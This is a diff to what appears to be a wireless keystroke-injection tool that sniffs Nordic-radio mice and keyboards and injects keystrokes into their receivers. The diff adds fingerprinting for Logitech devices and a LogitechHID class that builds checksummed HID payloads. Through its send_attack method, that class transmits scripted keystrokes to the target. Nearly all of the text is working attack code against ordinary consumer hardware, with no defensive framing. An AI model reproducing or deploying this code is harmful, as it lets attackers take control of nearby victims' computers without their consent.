@@ -319,6 +319,10 @@ class NordicScanner(object):
         elif len(p) == 16 and p[0] == 0x0a:
             # Most likely an XOR encrypted Microsoft keyboard
             return MS_KEYBOARD_ENC
+        elif len(p) == 10 and p[0] == 0 and p[1] == 0xC2:
+            return LOG_MOUSE
+        elif len(p) == 22 and p[0] == 0 and p[1] == 0xD3:
+            return LOG_KEYBOARD
         else:
             return 0
 
@@ -356,7 +360,7 @@ class MicrosoftHID(object):
             self.payload[4:6] = [0, 0]
             self.payload[6] = 67
         else:
-            raise 'Code error - not recognized as MS device'
+            raise ValueError('Not recognized as MS device')
 
         self.clear_payload()
 
@@ -446,6 +450,86 @@ class MicrosoftHID(object):
                 elif c['sleep']:
                     time.sleep(int(c['sleep']) / 1000.0)
 
+        self.send_key()
+
+
+class LogitechHID(object):
+
+    def __init__(self, detect, radio, address, payload):
+        self.radio = radio
+        self.address = address
+        self.string_address = self.hexify(address)
+        self.raw_address = self.unhexify_addr(self.string_address)
+        self.payload = payload[:]
+        self.ack_timeout = 4
+        self.retries = 15
+        self.device_vendor = 'Logitech'
+
+        if detect == LOG_MOUSE:
+            self.device_type = 2
+            self.encrypted = False
+        elif detect == LOG_KEYBOARD:
+            self.device_type = 1
+            self.encrypted = True
+        else:
+            raise ValueError('Not recognized as Logitech device')
+
+        self.clear_payload()
+
+    def hexify(self, val):
+        return ':'.join('{:02X}'.format(b) for b in val)
+
+    def unhexify_addr(self, val):
+        return self.unhexify(val)[::-1][:5]
+
+    def unhexify(self, val):
+        return val.replace(':', '').decode('hex')
+
+    def serialize_payload(self, p):
+        return str(bytearray(p))
+
+    def checksum(self):
+        cksum = 0xff
+        for n in range(0, len(self.payload) - 1):
+            cksum = (cksum - self.payload[n]) & 0xff
+        cksum = (cksum + 1) & 0xff
+        self.payload[-1] = cksum
+
+    def set_key(self, key):
+        self.payload[2] = 0
+        self.payload[3] = key['hid']
+        if key['meta']:
+            self.payload[2] |= 0x08
+        if key['shift']:
+            self.payload[2] |= 0x02
+
+    def clear_payload(self):
+        self.payload = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
+
+    def post_keystroke_delay(self):
+        pass
+
+    def send_key(self, c=None):
+        if not c:
+            self.clear_payload()
+            self.transmit()
+        else:
+            self.set_key(c)
+            self.transmit()
+
+    def transmit(self):
+        self.checksum()
+        self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
+        self.post_keystroke_delay()
+
+    def send_attack(self, attack):
+        with click.progressbar(attack) as bar:
+            for c in bar:
+                if c['hid']:
+                    self.send_key(c)
+                    self.send_key()
+                elif c['sleep']:
+                    time.sleep(int(c['sleep']) / 1000.0)
         self.send_key()
 
 
@@ -581,12 +665,12 @@ def cli(debug, script, lowpower, interval):
             device_type = target['device']
 
             scan.sniff(address)
+            device = None
             device_type = NordicScanner.fingerprint_device(payload)
             if device_type == MS_MOUSE or device_type == MS_MOUSE_ENC or device_type == MS_KEYBOARD_ENC:
                 device = MicrosoftHID(device_type, radio, address, payload)
             elif device_type == LOG_MOUSE or device_type == LOG_KEYBOARD:
-                # TODO: Add logitech code
-                device = None
+                device = LogitechHID(device_type, radio, address, payload)
 
             if device:
                 for channel in channels:
